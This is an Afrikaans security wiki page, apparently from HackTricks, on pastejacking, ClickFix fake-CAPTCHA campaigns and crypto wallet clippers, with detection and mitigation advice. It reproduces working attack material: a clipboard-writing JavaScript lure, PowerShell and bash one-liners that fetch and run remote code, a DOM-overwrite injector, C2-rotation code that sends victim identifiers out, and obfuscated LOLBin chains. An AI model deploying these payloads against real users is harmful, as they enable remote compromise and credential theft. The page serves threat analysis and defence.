# Clipboard Hijacking (Pastejacking)-aanvalle

{{#include ../../banners/hacktricks-training.md}}

> "Moet nooit enigiets plak wat jy nie self gekopieer het nie." – ou maar steeds geldige advies

## Oorsig

Clipboard hijacking – ook bekend as *pastejacking* – misbruik die feit dat gebruikers gereeld opdragte kopieer en plak sonder om dit te inspekteer. ’n Kwaadwillige webblad (of enige JavaScript-bekwame konteks soos ’n Electron- of Desktop-toepassing) plaas programmaties teks wat deur die aanvaller beheer word in die stelsel se clipboard. Slagoffers word normaalweg deur sorgvuldig saamgestelde social-engineering-instruksies aangemoedig om **Win + R** (Run-dialoog), **Win + X** (Quick Access / PowerShell) te druk, of ’n terminale oop te maak en die clipboard-inhoud te *plak*, waardeur arbitrêre opdragte onmiddellik uitgevoer word.

Omdat **geen lêer afgelaai en geen aanhegsel oopgemaak word nie**, omseil die tegniek die meeste e-pos- en webinhoud-sekuriteitsbeheermaatreëls wat aanhegsels, makro’s of direkte opdraguitvoering monitor. Die aanval is dus gewild in phishing-veldtogte wat algemene malware-families soos NetSupport RAT, Latrodectus loader of Lumma Stealer versprei.<sup>[[1]](#references)</sup>

## Wallet-adresvervangings-clippers

Nog ’n **clipboard hijacking**-variant plak glad nie opdragte nie: dit wag totdat die slagoffer ’n **cryptocurrency wallet-adres** kopieer en vervang dit dan stilweg met een wat deur die aanvaller beheer word, net voordat dit geplak word. Dit is veral effektief teen lang wallet-formate, omdat gebruikers dikwels slegs die eerste/laaste karakters verifieer.<sup>[[8]](#references)</sup>

Algemene eienskappe in die werklike wêreld:
- **Dun loader + geneste payload**: die sigbare app/exe lyk soos ’n wettige trading- of "profit"-tool, terwyl die werklike clipper dieper in die bundle versteek is (byvoorbeeld ’n .NET loader wat ’n geneste Rust-payload begin).
- **Regex-gedrewe vervanging**: die malware pas stringe soos `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, of selfs generiese **44-karakter Solana-agtige** stringe, en herskryf dit na aanvaller-wallets.
- **Wallet-rotasie op skaal**: moderne Windows-samples kan **duisende** vervangings-wallets per geldeenheid insluit in plaas van ’n enkele statiese adres, wat die verbranding van wallet-reputasie ná elke diefstal verminder.<sup>[[8]](#references)</sup>

### Windows clipper-vloei

’n Algemene implementering is ’n versteekte venster wat met **`AddClipboardFormatListener`** geregistreer is. Met elke clipboard-opdatering roep die malware tipies die volgende aan:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → kry toegang tot huidige clipboard-data.
- **`GetClipboardData`** → lees teks.
- **`EmptyClipboard`** + **`SetClipboardData`** → vervang die wallet-string met die aanvaller se waarde.

Minimale hunting-regexes wat dikwels in clippers gesien word:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Volharding op gebruikersvlak is voldoende vir impak. Een waargenome patroon is:<sup>[[8]](#references)</sup>
- Kopieer die payload na **`%APPDATA%\silke\silke.exe`**
- Skep ’n **Startup-folder LNK** onder `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Opsporingsidees:
- Prosesse wat voortdurend clipboard-API’s aanroep terwyl hulle ook onder `%APPDATA%` en die gebruiker se **Startup**-folder skryf.
- Nuwe LNK-/uitvoerbare-lêerskepping gevolg deur clipboard-herskrywings van wallet-adresse.
- Argiewe of fake-software-bundels wat baie ongebruikte lêers bevat plus ’n klein launcher wat ’n geneste binary begin.

### macOS-sosiaal-gemanipuleerde quarantine-verwydering + LaunchAgent-volharding

Op macOS versprei sommige veldtogte ’n **`unlocker.command`**-helper en gee die slagoffer opdrag om regs te klik → **Open** as Gatekeeper sê dat die app beskadig is of van ’n ongeïdentifiseerde ontwikkelaar afkomstig is. Die script verwyder eenvoudig quarantine en begin die nabygeleë `.app`:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Dit is **nie** ’n Gatekeeper-exploit nie; dit is ’n **sosiaal-gemanipuleerde quarantine-bypass** wat misbruik maak van die feit dat Gatekeeper-besluite van die `com.apple.quarantine` xattr afhang.<sup>[[8]](#references)</sup>

Ná uitvoering kan die clipper as die huidige gebruiker volhard deur die volgende te skryf:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent met `RunAtLoad` en `KeepAlive`

’n Nuttige defensiewe detail is dat sommige samples ’n **self-healing watchdog** implementeer wat die LaunchAgent en wrapper elke ~30 sekondes herskryf. As jy die plist eerste verwyder **sonder om die lopende proses te beëindig**, kan die malware dit onmiddellik herskep.<sup>[[8]](#references)</sup> Veilige opruimingsvolgorde:
1. Kill die aktiewe clipper-proses.
2. Unload/delete die LaunchAgent plist.
3. Delete `~/launch.sh` en die gekopieerde payload.

### Delivery note: fake reputation as a force multiplier

Vir hierdie familie kan die malware self tegnies eenvoudig bly terwyl die **distribution layer** die swaar werk doen: vals GitHub-stars/forks, SourceForge-resensies/aflaaie, YouTube-tutoriaal-kommentare/kyke, en onskuldig lykende VirusTotal-kommentare/stemme word gebruik om die binary betroubaar te laat voorkom voor uitvoering.<sup>[[8]](#references)</sup>

## Forced copy buttons and hidden payloads (macOS one-liners)

Sommige macOS-infostealers kloon installer-webwerwe (bv. Homebrew) en **dwing die gebruik van ’n “Copy”-knoppie af** sodat gebruikers nie net die sigbare teks kan selekteer nie. Die clipboard-inskrywing bevat die verwagte installer command plus ’n aangehegte Base64-payload (bv. `...; echo <b64> | base64 -d | sh`), sodat een enkele paste albei uitvoer terwyl die UI die ekstra stadium versteek.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ouer veldtogte het `document.execCommand('copy')` gebruik, terwyl nuwer veldtogte op die asinchrone **Clipboard API** (`navigator.clipboard.writeText`) staatmaak.<sup>[[2]](#references)</sup>

## Die ClickFix / ClearFake-vloei

1. Gebruiker besoek ’n typosquatted- of gekompromitteerde webwerf (bv. `docusign.sa[.]com`)
2. Geïnjekteerde **ClearFake** JavaScript roep ’n `unsecuredCopyToClipboard()`-helper aan wat stilweg ’n Base64-geënkodeerde PowerShell one-liner in die knipbord stoor.
3. HTML-instruksies sê vir die slagoffer: *“Druk **Win + R**, plak die opdrag en druk Enter om die probleem op te los.”*
4. `powershell.exe` word uitgevoer en laai ’n argief af wat ’n wettige uitvoerbare lêer plus ’n kwaadwillige DLL bevat (klassieke DLL sideloading).
5. Die loader dekripteer bykomende stages, injecteer shellcode en installeer persistence (bv. ’n geskeduleerde taak) – wat uiteindelik NetSupport RAT / Latrodectus / Lumma Stealer uitvoer.<sup>[[1]](#references)</sup>

### Voorbeeld van NetSupport RAT-ketting
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitieme Java WebStart) soek sy gids vir `msvcp140.dll`.
* Die kwaadwillige DLL los API's dinamies op met **GetProcAddress**, laai twee binaries (`data_3.bin`, `data_4.bin`) af via **curl.exe**, dekripteer hulle met behulp van 'n rollende XOR-sleutel `"https://google.com/"`, spuit die finale shellcode in en pak **client32.exe** (NetSupport RAT) uit na `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Laai `la.txt` af met **curl.exe**
2. Voer die JScript downloader binne **cscript.exe** uit
3. Haal 'n MSI payload af → plaas `libcef.dll` langs 'n getekende toepassing → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Die **mshta**-aanroep begin ’n versteekte PowerShell-script wat `PartyContinued.exe` ophaal, `Boat.pst` (CAB) onttrek, `AutoIt3.exe` deur middel van `extrac32` en lêersamesmelting rekonstrueer, en uiteindelik ’n `.a3x`-script uitvoer wat blaaierbewyse na `sumeriavgv.digital` eksfiltreer.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Sommige ClickFix-veldtogte slaan lêeraflaaie heeltemal oor en gee slagoffers opdrag om ’n eenreël-opdrag te plak wat JavaScript via WSH ophaal en uitvoer, dit volhou, en C2 daagliks roteer. Voorbeeld van ’n waargenome ketting:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sleutelkenmerke
- Geobfuskeerde URL wat tydens looptyd omgekeer word om toevallige inspeksie te verydel.
- JavaScript behou homself via ’n Startup LNK (WScript/CScript), en kies die C2 volgens die huidige dag – wat vinnige domeinrotasie moontlik maak.<sup>[[3]](#references)</sup>

Minimale JS-fragment wat gebruik word om C2’s volgens datum te roteer:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Die volgende stadium ontplooi gewoonlik ’n loader wat persistence vestig en ’n RAT (bv. PureHVNC) aflaai, dikwels deur TLS aan ’n hardcoded sertifikaat te pin en verkeer in chunks te verdeel.<sup>[[3]](#references)</sup>

Detection-idees spesifiek vir hierdie variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (of `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wat WScript/CScript aanroep met ’n JS-pad onder `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU en command-line telemetry wat `.split('').reverse().join('')` of `eval(a.responseText)` bevat.
- Herhaalde `powershell -NoProfile -NonInteractive -Command -` met groot stdin-payloads om lang scripts te voer sonder lang command lines.
- Scheduled Tasks wat vervolgens LOLBins uitvoer, soos `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, onder ’n updater-agtige task/path (bv. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daagliks roterende C2-hostname en URLs met die patroon `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korrelleer clipboard write-events wat gevolg word deur Win+R paste en dan onmiddellike `powershell.exe`-uitvoering.

Blue-teams kan clipboard-, process-creation- en registry-telemetry kombineer om pastejacking-misbruik te identifiseer:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` hou ’n geskiedenis van **Win + R**-commands – soek na ongewone Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) waar `ParentImage` == `explorer.exe` en `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } is.
* Event ID **4663** vir file creations onder `%LocalAppData%\Microsoft\Windows\WinX\` of temporary folders net voor die verdagte 4688-event.
* EDR clipboard sensors (indien beskikbaar) – korreleer `Clipboard Write` wat onmiddellik deur ’n nuwe PowerShell-process gevolg word.

## IUAM-styl-verifikasiebladsye (ClickFix Generator): clipboard copy-to-console + OS-bewuste payloads

Onlangse campaigns massaproduseer vals CDN/browser-verifikasiebladsye ("Just a moment…", IUAM-styl) wat gebruikers dwing om OS-spesifieke commands vanaf hul clipboard na native consoles te kopieer. Dit verskuif uitvoering uit die browser sandbox en werk oor Windows en macOS heen.<sup>[[4]](#references)</sup>

Belangrike eienskappe van die builder-gegenereerde bladsye
- OS-detection via `navigator.userAgent` om payloads aan te pas (Windows PowerShell/CMD teenoor macOS Terminal). Opsionele decoys/no-ops vir unsupported OS’e om die illusie te behou.
- Automatic clipboard-copy tydens benign UI-actions (checkbox/Copy), terwyl die sigbare teks van die clipboard-inhoud kan verskil.
- Mobile blocking en ’n popover met stap-vir-stap-instruksies: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opsionele obfuscation en single-file injector om ’n compromised site se DOM te overwrite met ’n Tailwind-styled verification UI (geen nuwe domain registration benodig nie).<sup>[[4]](#references)</sup>

Voorbeeld: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS-volharding van die aanvanklike uitvoering
- Gebruik `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` sodat uitvoering voortgaan nadat die terminaal sluit, wat sigbare artefakte verminder.<sup>[[4]](#references)</sup>

Oorneem van bladsye in plek op gekompromitteerde werwe
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Opsporings- en hunting-idees spesifiek vir IUAM-styl-lokmiddels
- Web: Bladsye wat die Clipboard API aan verifikasie-widgets bind; teenstrydigheid tussen die vertoonde teks en die clipboard-payload; `navigator.userAgent`-vertakking; Tailwind + enkelbladsy-vervanging in verdagte kontekste.
- Windows-endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` kort ná ’n blaaierinteraksie; batch/MSI-installers wat vanaf `%TEMP%` uitgevoer word.
- macOS-endpoint: Terminal/iTerm wat `bash`/`curl`/`base64 -d` met `nohup` naby blaaiergebeure voortbring; agtergrondtake wat voortleef nadat die terminale gesluit is.
- Korrelleer `RunMRU` Win+R-geskiedenis en clipboard-skryfbewerkings met daaropvolgende konsoleprosesskepping.

Sien ook vir ondersteunende tegnieke

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix-evolusies (ClearFake, Scarlet Goldfinch)

- ClearFake gaan voort om WordPress-webwerwe te kompromitteer en loader-JavaScript in te voeg wat eksterne hosts (Cloudflare Workers, GitHub/jsDelivr) aan mekaar skakel, asook blockchain-“etherhiding”-oproepe (bv. POST’s na Binance Smart Chain API-endpoints soos `bsc-testnet.drpc[.]org`) om die huidige lokmiddel-logika te verkry. Onlangse overlays gebruik toenemend fake CAPTCHA’s wat gebruikers opdrag gee om ’n one-liner (T1204.004) te copy/paste in plaas daarvan om enigiets af te laai.<sup>[[6]](#references)</sup>
- Aanvanklike uitvoering word toenemend aan ondertekende script-hosts/LOLBAS gedelegeer. Januarie 2026-kettings het vroeëre `mshta`-gebruik vervang met die ingeboude `SyncAppvPublishingServer.vbs`, wat via `WScript.exe` uitgevoer word en PowerShell-agtige argumente met aliases/wildcards deurgee om afgeleë inhoud te verkry:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` is onderteken en word normaalweg deur App-V gebruik; wanneer dit met `WScript.exe` en ongewone argumente (`gal`/`gcm`-aliasse, cmdlets met wildcards, jsDelivr-URL's) gekombineer word, word dit ’n hoë-sein-LOLBAS-stadium vir ClearFake.<sup>[[6]](#references)</sup>
- Vals CAPTCHA-payloads het in Februarie 2026 teruggeskuif na suiwer PowerShell-download cradles. Twee aktiewe voorbeelde:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Die eerste chain is ’n in-memory `iex(irm ...)` grabber; die tweede stage via `WinHttp.WinHttpRequest.5.1`, skryf ’n tydelike `.ps1`, en launch dit dan met `-ep bypass` in ’n hidden window.<sup>[[6]](#references)</sup>

Opsporings-/hunting-wenke vir hierdie variante
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` of PowerShell cradles onmiddellik ná clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker-domains, of raw IP `iex(irm ...)`-patterns.
- Network: outbound-verbindings na CDN worker-hosts of blockchain RPC-endpoints vanaf script hosts/PowerShell kort ná web browsing.
- File/registry: skep van tydelike `.ps1` onder `%TEMP%` plus RunMRU-inskrywings wat hierdie one-liners bevat; block/alert op signed-script LOLBAS (WScript/cscript/mshta) wat met external URLs of obfuscated alias strings uitvoer.

## June 2026 ClickFix tradecraft: paste-telemetry, fake verification comments, en LOLBin chaining

Onlangse Red Canary-telemetry toon dat die stabiele indicator **nie een presiese command is nie**, maar die kombinasie van **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, en **immediate execution**.<sup>[[7]](#references)</sup>

### Notable operator patterns

- **Paste confirmation telemetry**: sommige payloads roep `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` aan voor die werklike stage. Dit bevestig user interaction terwyl die window kort en stil gehou word.
- **Fake verification comments**: PowerShell one-liners kan strings soos `# Security check ✔️ I'm not a robot Verification ID: 138105` aanheg sodat die command steeds CAPTCHA-related lyk nadat dit in Run / `cmd.exe` / PowerShell history geplak is.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` vermy ’n static URL in die command line terwyl dit steeds in-memory download-and-execute uitvoer.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` misbruik ongewone casing en Unicode-like characters in flags om brittle detections te omseil terwyl dit steeds soos `msiexec.exe` lyk.
- **Caret-escaped LOLBin chains**: `cmd.exe` kan keywords met `^` escapes versteek (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), die nested shell minimized start, attacker content met ’n benign extension soos `.pdf` stoor, en dit dan deur `mshta` uitvoer.<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` ens.) of vereis user gesture.
2. Security awareness – leer users om sensitive commands te *tik* of dit eers in ’n text editor te paste.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control om arbitrary one-liners te block.
4. Network controls – block outbound requests na bekende pastejacking- en malware C2-domains.

## Verwante Tricks

* **Discord Invite Hijacking** misbruik dikwels dieselfde ClickFix-benadering nadat users na ’n malicious server gelok is:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Fix the Click: Voorkoming van die ClickFix-aanvalsvektor](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Onder die Pure Curtain: Van RAT tot Builder tot Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: Eerste blootstelling van IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, die jaar van die Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: Februarie 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: Junie 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Van Stars tot Upvotes: Fake Reputation wat ’n Crypto Clipboard Hijacker aandryf](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
